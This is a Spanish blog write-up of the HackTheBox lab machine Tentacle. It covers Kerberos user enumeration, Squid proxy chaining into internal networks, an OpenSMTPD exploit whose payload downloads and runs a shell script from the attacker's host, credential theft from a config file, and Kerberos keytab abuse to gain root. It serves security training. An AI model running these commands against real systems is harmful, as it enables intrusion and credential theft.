---
layout: single
title: Tentacle HTB - WriteUp
excerpt: WriteUp de la máquina Tentacle de HTB.
date: 2023-02-22
classes: wide
header:
  teaser: /assets/images/Tentacle/Tentacle.png
  teaser_home_page: true
  icon: /assets/images/Tentacle/Tentacle.png
categories:
  - infosec
tags:
  - ctf
  - Linux                                                                                                                                                                                 
  - Writeup
  - SQUID
  - CVE
  - Kerberos
---

En el día de hoy estaremos resolviendo la máquina Tentacle de HackTheBox. En ella aprenderemos cosas sobre SQUID proxy y kerberos.

### Enumeracíon Inicial

Lo primero será ver si hay servicios expuestos. Para esta tarea usaremos la herramienta nmap.

```bash
❯ nmap -sC -sV -Pn -oN Extraction -p22,53,88,3128 10.10.10.224
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2023-02-23 17:10 CET
Nmap scan report for 10.10.10.224
Host is up (0.075s latency).

PORT     STATE SERVICE      VERSION
22/tcp   open  ssh          OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 8d:dd:18:10:e5:7b:b0:da:a3:fa:14:37:a7:52:7a:9c (RSA)
|   256 f6:a9:2e:57:f8:18:b6:f4:ee:03:41:27:1e:1f:93:99 (ECDSA)
|_  256 04:74:dd:68:79:f4:22:78:d8:ce:dd:8b:3e:8c:76:3b (ED25519)
53/tcp   open  domain       ISC BIND 9.11.20 (RedHat Enterprise Linux 8)
| dns-nsid: 
|_  bind.version: 9.11.20-RedHat-9.11.20-5.el8
88/tcp   open  kerberos-sec MIT Kerberos (server time: 2023-02-23 16:10:33Z)
3128/tcp open  http-proxy   Squid http proxy 4.11
|_http-server-header: squid/4.11
|_http-title: ERROR: The requested URL could not be retrieved
Service Info: Host: REALCORP.HTB; OS: Linux; CPE: cpe:/o:redhat:enterprise_linux:8
```

Vemos varios puertos interesantes abiertos:

| Puerto      | Servicio |
| ----------- | ----------- |
| 22      | SSH       |
| 53   | DNS        |
| 3128  | SQUID proxy       |
| 88   | Kerberos        |

Bien, lo primero que hare sera ver que información nos da el squid a traves del protocolo http.

```bash
❯ curl -s 10.10.10.224:3128 | html2text

****** ERROR ******
***** The requested URL could not be retrieved *****
===============================================================================
The following error was encountered while trying to retrieve the URL: /
     Invalid URL
Some aspect of the requested URL is incorrect.
Some possible problems are:
    * Missing or incorrect access protocol (should be http:// or similar)
    * Missing hostname
    * Illegal double-escape in the URL-Path
    * Illegal character in hostname; underscores are not allowed.
Your cache administrator is j.nakazawa@realcorp.htb.

===============================================================================
Generated Thu, 23 Feb 2023 16:16:15 GMT by srv01.realcorp.htb (squid/4.11)
```

Vemos un error que nos proporciona algo de información:

- Un correo: [j.nakazawa@realcorp.htb](mailto:j.nakazawa@realcorp.htb?subject=CacheErrorInfo%20-%20ERR_INVALID_URL&body=CacheHost%3A%20srv01.realcorp.htb%0D%0AErrPage%3A%20ERR_INVALID_URL%0D%0AErr%3A%20%5Bnone%5D%0D%0ATimeStamp%3A%20Thu,%2023%20Feb%202023%2016%3A16%3A57%20GMT%0D%0A%0D%0AClientIP%3A%2010.10.16.4%0D%0A%0D%0AHTTP%20Request%3A%0D%0A%0D%0A%0D%0A).
-  Un subdominio: srv01.realcorp.htb

El subdominio lo meteré en el etc hosts junto con el dominio principal. Ademas aprovechando que kerberos esta abierto voy a ver si el usuario j.nakazawa es valido.

```bash
❯ ./kerbrute userenum --dc 10.10.10.224 -d realcorp.htb username

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 02/23/23 - Ronnie Flathers @ropnop

2023/02/23 17:24:41 >  Using KDC(s):
2023/02/23 17:24:41 >   10.10.10.224:88

2023/02/23 17:24:41 >  [+] j.nakazawa has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$j.nakazawa@REALCORP.HTB:4c7505a968f24fba278cd979c4adadd0$618480302f6ecba1617788d10cfc01e9098978efd4875d3789fed937857bf7b99b654644d82b3f6a37a1ced21b41180f96f0ae5a066fbc08523cbbbff8fea9484b69d7f7c81260ea84e5973ee1c90a038e310c3f517d97a17403ea989b85a51b2800a74288a15faf4471f94d9b93f105021ca41b76cfb01c37db83b3a10017e6471a6e80024a3d13d6c4415749e104c391480e4a6f1e1c3bde699f0e28ab39ddfa3b58f8b48b80082f42b918a40c68ed1ea813c53b11f8fe9cef38ee1b1a1628389a30de0adb89
2023/02/23 17:24:41 >  [+] VALID USERNAME:       j.nakazawa@realcorp.htb
```

El usuario es valido y ademas nos proporciona un ticket asrep. Esto es un rabbit Hole (no se puede romper el hash), debemos continuar.

Ahora voy a enumerar el servidor DNS en busqueda de registros, subdominios... etc. Para ello usare la herramienta dnsenum.

```bash
❯ dnsenum -f /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt  --dnsserver 10.10.10.224 --enum realcorp.htb
```

Esto nos descubre los siguientes subdominios que apuntan a redes internas. Nosotros no tenemos acceso a proxy.realcorp.htb ni a wpad.realcorp.htb.  

```bash
ns.realcorp.htb.                         259200   IN    A        10.197.243.77
proxy.realcorp.htb.                      259200   IN    CNAME    ns.realcorp.htb.
ns.realcorp.htb.                         259200   IN    A        10.197.243.77
wpad.realcorp.htb.                       259200   IN    A        10.197.243.31
```

Pero gracias a proxychains vamos a poder llegar a esas máquinas. Primero metí esas entradas en el /etc/hosts.

```bash
10.10.10.224 realcorp.htb srv01.realcorp.htb
10.197.243.77 proxy.realcorp.htb 
10.197.243.31 wpad.realcorp.htb
```

El /etc/host quedaría de la siguiente forma.

### SQUID ABUSE

Lo siguiente fue intentar pasar a traves del proxy. Para ello utilizaré proxycchains. Voy a explicar brevemente lo que permite hacer proxychains.

Proxychains es una herramienta que nos permite concatenar proxies, en este caso nos viene muy bien porque no disponemos acceso a una red en concreto. Probablemente sea una 10.197.243.0/24. Si  concatenamos proxies puede que podamos enumerar esa red.

Para esta tareá tambien tenemos que saber que SQUID proxy tiene dos "interfaces" una interna y otra externa. Actualmente nosotros solo tenemos acceso a la externa, pero podemos pasar por la interna de la siguiente forma.

```bash
 tail /etc/proxychains.conf
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4 127.0.0.1 9050
# socks4 127.0.0.1 8081
http 10.10.10.224 3128
http 127.0.0.1 3128
```

De esta forma estaremos entrando por el proxy y a traves de este podemos intentar ver si tenemos acceso con la red 10.197.243.0/24 para ello tendriamos que pasar a traves del host que tiene el proxy, finalmente quedaría así el proxychains

```bash
http 10.10.10.224 3128
http 127.0.0.1 3128
http 10.197.243.77 3128
```

![](/assets/images/Tentacle/img1.png)

Proxychains hace lo siguiente:

```bash

|S-chain|-<>-10.10.10.224:3128-<>-127.0.0.1:3128-<>-10.197.243.77:3128-<><>-10.197.243.31:993-<--denied
```

Hace ese recorrido de proxies.

Si intentamos hacer un escaneo de nmap al host 10.197.243.31 deberiamos poder verlo.

```bash
❯ proxychains nmap -sT -v -T5 -Pn -oN WpadScan 10.197.243.31                                                                                                                                 
ProxyChains-3.1 (http://proxychains.sf.net)                                                                                                                                                  
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.                                                                                              
Starting Nmap 7.91 ( https://nmap.org ) at 2023-02-23 18:10 CET                                                                                                                              
Initiating Connect Scan at 18:10                                                                                                                                                             
Scanning wpad.realcorp.htb (10.197.243.31) [1000 ports]                                                                                                                                      
|S-chain|-<>-10.10.10.224:3128-<>-127.0.0.1:3128-<>-10.197.243.77:3128-<><>-10.197.243.31:21-<--denied                                                                                       
|S-chain|-<>-10.10.10.224:3128-<>-127.0.0.1:3128-<>-10.197.243.77:3128-<><>-10.197.243.31:8888-<--denied                                                                                     
Discovered open port 80/tcp on 10.197.243.31
```

Nos descubre el puerto 80, vamos a ver su contenido. Vemos un forbidden:

```bash
❯ proxychains curl wpad.realcorp.htb
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-10.10.10.224:3128-<>-127.0.0.1:3128-<>-10.197.243.77:3128-<><>-10.197.243.31:80-<><>-OK
<html>
<head><title>403 Forbidden</title></head>
<body bgcolor="white">
<center><h1>403 Forbidden</h1></center>
<hr><center>nginx/1.14.1</center>
</body>
</html>
```

Si investigamos un poco, yo lo hice en hacktricks podemos ver que WPAD sirve para cargar configuraciones de proxies a navegadores, esto se hace a traves de un archivo llamado wpad.dat. Voy a ver si este archivo es accesible.

```bash
❯ proxychains curl wpad.realcorp.htb/wpad.dat
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-10.10.10.224:3128-<>-127.0.0.1:3128-<>-10.197.243.77:3128-<><>-10.197.243.31:80-<><>-OK
function FindProxyForURL(url, host) {
    if (dnsDomainIs(host, "realcorp.htb"))
        return "DIRECT";
    if (isInNet(dnsResolve(host), "10.197.243.0", "255.255.255.0"))
        return "DIRECT"; 
    if (isInNet(dnsResolve(host), "10.241.251.0", "255.255.255.0"))
        return "DIRECT"; 
 
    return "PROXY proxy.realcorp.htb:3128";
}
```

Estamos viendo otra red... 10.241.251.0/24 Voy a crear un script en bash para intentar descubrir hosts y enumerar puertos.

```bash
#!/bin/bash
for p in $(seq 1 65535);do

        for i in $(seq 1 245);do

                proxychains timeout 1 bash -c "echo '' > /dev/tcp/10.241.251.$i/$p" 2>/dev/null && echo "[!] Puerto $p del host 10.241.251.$i ABIERTO" &

        done;wait
done
```

Si lo ejecutamos podemos ver lo siguiente:

```bash
❯ nano script.sh
❯ ./script.sh | grep -v 'ProxyChains-3.1 (http://proxychains.sf.net)'
[!] Puerto 22 del host 10.241.251.1 ABIERTO
[!] Puerto 53 del host 10.241.251.1 ABIERTO
[!] Puerto 88 del host 10.241.251.1 ABIERTO
[!] Puerto 749 del host 10.241.251.1 ABIERTO
[!] Puerto 3128 del host 10.241.251.1 ABIERTO
```

Debido a la tardanza puse los puertos bien conocidos. Finalmente descubrí lo siguiente.

```bash
❯ ./script.sh | grep -v 'ProxyChains-3.1 (http://proxychains.sf.net)'
[!] Puerto 22 del host 10.241.251.1 ABIERTO
[!] Puerto 25 del host 10.241.251.113 ABIERTO
```

### SMTP EXPLOIT

El puerto 25 (smtp) esta abierto en el host 10.241.251.113 vamos a indagar un poco mas con nmap.

```bash
PORT   STATE SERVICE VERSION
25/tcp open  smtp    OpenSMTPD
| smtp-commands: smtp.realcorp.htb Hello nmap.scanme.org [10.241.251.1], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP, 
|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info 
Service Info: Host: smtp.realcorp.htb
```

Usa una versión bastante antigua si usamos este exploit  https://www.exploit-db.com/exploits/47984 podemos ejeucutar comandos a nivel de sistema e intentar establecernos una revshell. Tendremos que modificar el exploit porque el destinatario debe existir. En este caso es el mail que teniamos anteriormente.

Tendremos que ejecutar el exploit tirando de proxychains

```bash
❯ proxychains python3 47984.py 10.241.251.113 25 'wget 10.10.16.4/shell.sh -O /tmp/shell.sh; bash /tmp/shell.sh'
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-10.10.10.224:3128-<>-127.0.0.1:3128-<>-10.197.243.77:3128-<><>-10.241.251.113:25-<><>-OK
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done
```


Si revisamos nuestro listener veremos que tenemos una shell.

```bash
root@smtp:~# export TERM=xterm
root@smtp:~# export SHELL=bash
root@smtp:~# stty rows 51 columns 189
root@smtp:~# 
```

No estamos en la máquina principal, si revisamos los archivos del directorio personal del usuario podemos encontrar el siguiente archivo:

```bash
root@smtp:/home/j.nakazawa# cat .msmtprc 
# Set default values for all following accounts.
defaults
auth           on
tls            on
tls_trust_file /etc/ssl/certs/ca-certificates.crt
logfile        /dev/null

# RealCorp Mail
account        realcorp
host           127.0.0.1
port           587
from           j.nakazawa@realcorp.htb
user           j.nakazawa
password       sJB}RM>6Z~64_
tls_fingerprint C9:6A:B9:F6:0A:D4:9C:2B:B9:F6:44:1F:30:B8:5E:5A:D8:0D:A5:60

# Set a default account
account default : realcorp
```

### Kerberos Abuse

Un usuario y una contraseña. Si intentamos conectarnos por ssh a la máquina nos saldrá el siguiente error.

```bash
❯ ssh j.nakazawa@10.10.10.224
The authenticity of host '10.10.10.224 (10.10.10.224)' can't be established.
ECDSA key fingerprint is SHA256:eWzMB5HoqVH++9udWLB4bYS/8KguhJxNZPtZ3JLc3oo.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.224' (ECDSA) to the list of known hosts.
j.nakazawa@10.10.10.224's password: 
Permission denied, please try again.
j.nakazawa@10.10.10.224's password: 
Permission denied, please try again.
j.nakazawa@10.10.10.224's password: 
j.nakazawa@10.10.10.224: Permission denied (gssapi-keyex,gssapi-with-mic,password).
```

"gssapi-keyex,gssapi-with-mic,password" esto quiere decir que la autenticación se esta haciendo por Kerberos.

Necesitaremos descargar el paquete krb5-user. Podemos descargarlo con el gestor de paquetes apt

Entraremos en la siguiente configuración:

Tendremos que poner el nombre del dominio.

![](/assets/images/Tentacle/img2.png)

Le suministramos la dirección IP:

![](/assets/images/Tentacle/img3.png)

Ahora tendremos que modificar el archivo /etc/krb5.conf y tiene que tener la siguiente estructura:

```bash
[libdefaults]
        default_realm = REALCORP.HTB

[realms]
        REALCORP.HTB = {
                kdc = srv01.realcorp.htb
        }

[domain_realm]
        .REALCORP.HTB = REALCORP.HTB
        .REALCORP.HTB = REALCORP.HTB
```

Ahora solicitaremos un ticker de kerberos. 

```bash
❯ kinit j.nakazawa
Password for j.nakazawa@REALCORP.HTB:
```

Si hacemos esto e introducimos las credenciales que teniamos se nos asignará un ticket que podremos usar para conectarnos por ssh. Podemos listar nuestros tickets con klist.

```bash
❯ klist
Ticket cache: FILE:/tmp/krb5cc_0
Default principal: j.nakazawa@REALCORP.HTB

Valid starting     Expires            Service principal
23/02/23 19:50:26  24/02/23 19:50:26  krbtgt/REALCORP.HTB@REALCORP.HTB
```

Ahora que tenemos un ticker podemos conectarnos por ssh sin necesidad de contraseñas.

```bash
❯ ssh -K j.nakazawa@10.10.10.224
Activate the web console with: systemctl enable --now cockpit.socket

Last failed login: Thu Feb 23 18:55:41 GMT 2023 from 10.10.16.4 on ssh:notty
There were 7 failed login attempts since the last successful login.
Last login: Thu Dec 24 06:02:06 2020 from 10.10.14.2
[j.nakazawa@srv01 ~]$ 
```

### PRIVESC

La opcion -K asegura que la autenticación sea por kerberos. Si enumeramos la máquina podemos ver que hay una tarea cron que se ejecuta como usuario admin.

```bash
[j.nakazawa@srv01 ~]$ cat /etc/crontab 
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed
* * * * * admin /usr/local/bin/log_backup.sh
[j.nakazawa@srv01 ~]$
```

El script contiene lo siguiente:

```bash
[j.nakazawa@srv01 ~]$ cat /usr/local/bin/log_backup.sh
#!/bin/bash

/usr/bin/rsync -avz --no-perms --no-owner --no-group /var/log/squid/ /home/admin/
cd /home/admin
/usr/bin/tar czf squid_logs.tar.gz.`/usr/bin/date +%F-%H%M%S` access.log cache.log
/usr/bin/rm -f access.log cache.log
```

- Utiliza el comando "rsync" para sincronizar los archivos y directorios del directorio "/var/log/squid/" con el directorio "/home/admin/", utilizando las opciones "-avz" para copiar los archivos en modo de archivo, comprimirlos y ver los progresos respectivamente. También utiliza las opciones "--no-perms", "--no-owner" y "--no-group" para que los permisos, propietarios y grupos no se copien.

- Cambia el directorio de trabajo a "/home/admin".

- Crea un archivo tar comprimido llamado "squid_logs.tar.gz" en el directorio actual, que contiene los archivos "access.log" y "cache.log" del directorio actual. El archivo se nombra con la fecha actual en formato "YYYY-MM-DD-HHMMSS".

- Borra los archivos "access.log" y "cache.log" del directorio actual.

Sabiendo esto necesito saber que privilegios tengo sobre el directorio /var/log/squid/

```bash
[j.nakazawa@srv01 ~]$ ls -la /var/log | grep squid
drwx-wx---.  2 admin  squid      41 dic 24  2020 squid
```

Puedo crear archivos, pero no puedo listar. La idea será que como está Kerberos detras vamos a crear un archivo .k5login que nos permitirá autenticarnos como el usuario admin. https://web.mit.edu/kerberos/krb5-devel/doc/user/user_config/k5login.html

El archivo contendrá lo siguiente:

```bash
echo 'j.nakazawa@REALCORP.HTB' > .k5login
```

Si esperamos un minuto a que se ejecute la tarea cron podremos autenticarnos con el usuario admin, debido a que se esta sincronizando el directorio de squid con el home de admin.

```bash
❯ ssh -K admin@10.10.10.224
Activate the web console with: systemctl enable --now cockpit.socket

Last login: Thu Feb 23 19:18:01 2023
[admin@srv01 ~]$ id
uid=1011(admin) gid=1011(admin) grupos=1011(admin),23(squid) contexto=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[admin@srv01 ~]$ 
```

Si miramos los archivos y carpetas que pertenecen al grupo admin podemos ver que hay uno que es /etc/krb5.keytab

```bash
[admin@srv01 ~]$ find / -group admin 2>/dev/null                                                                                                                                             
/home/admin                                                                                                                                                                                  
/home/admin/.ssh                                                                                                                                                                             
/home/admin/squid_logs.tar.gz.2023-02-23-191902                                                                                                                                              
/home/admin/squid_logs.tar.gz.2023-02-23-192002                                                                                                                                              
/home/admin/squid_logs.tar.gz.2023-02-23-192102                                                                                                                                              
/usr/local/bin/log_backup.sh                                                                                                                                                                 
/etc/krb5.keytab
```

Podemos aprovecharnos de este archivo de la siguiente forma. Podemos listar los "Principal" de la siguiente forma

```bash
[admin@srv01 ~]$ klist -k /etc/krb5.keytab
Keytab name: FILE:/etc/krb5.keytab
KVNO Principal
   2 host/srv01.realcorp.htb@REALCORP.HTB
   2 host/srv01.realcorp.htb@REALCORP.HTB
   2 host/srv01.realcorp.htb@REALCORP.HTB
   2 host/srv01.realcorp.htb@REALCORP.HTB
   2 host/srv01.realcorp.htb@REALCORP.HTB
   2 kadmin/changepw@REALCORP.HTB
   2 kadmin/changepw@REALCORP.HTB
   2 kadmin/changepw@REALCORP.HTB
   2 kadmin/changepw@REALCORP.HTB
   2 kadmin/changepw@REALCORP.HTB
   2 kadmin/admin@REALCORP.HTB
   2 kadmin/admin@REALCORP.HTB
   2 kadmin/admin@REALCORP.HTB
   2 kadmin/admin@REALCORP.HTB
   2 kadmin/admin@REALCORP.HTB
```

Ahora  con kadmin nos vamos a autenticar en el principal "kadmin/admin@REALCORP.HTB"

```bash
[admin@srv01 ~]$ kadmin -kt /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB
Couldn't open log file /var/log/kadmind.log: Permission denied
Authenticating as principal kadmin/admin@REALCORP.HTB with keytab /etc/krb5.keytab.
kadmin: 
```

Ahora desde aquí vamos a crear un nuevo "Principal" para sobreescribir la contraseña de root.

> cuando un usuario se autentica con Kerberos, su principal se verifica en el archivo `/etc/krb5.keytab` para asegurarse de que tiene acceso autorizado al sistema y a los servicios protegidos. Si la autenticación es exitosa, se crea una sesión de autenticación en el sistema, lo que permite al usuario acceder a los recursos protegidos y ejecutar tareas en el sistema.

```bash
kadmin:  add_principal root@REALCORP.htb
No policy specified for root@REALCORP.htb; defaulting to no policy
Enter password for principal "root@REALCORP.htb": 
Re-enter password for principal "root@REALCORP.htb": 
Principal "root@REALCORP.htb" created.
```

Le introducimos la credencial que queramos... Si ahora tratamos de usar ksu podemos autenticarnos con esa password y iniciar sesión como el usuario root.

```bash
[admin@srv01 ~]$ ksu
WARNING: Your password may be exposed if you enter it here and are logged 
         in remotely using an unsecure (non-encrypted) channel. 
Kerberos password for root@REALCORP.HTB: : 
Authenticated root@REALCORP.HTB
Account root: authorization for root@REALCORP.HTB successful
Changing uid to root (0)
[root@srv01 admin]#
```

Ya hemos pwneado la máquina, espero que te sirva!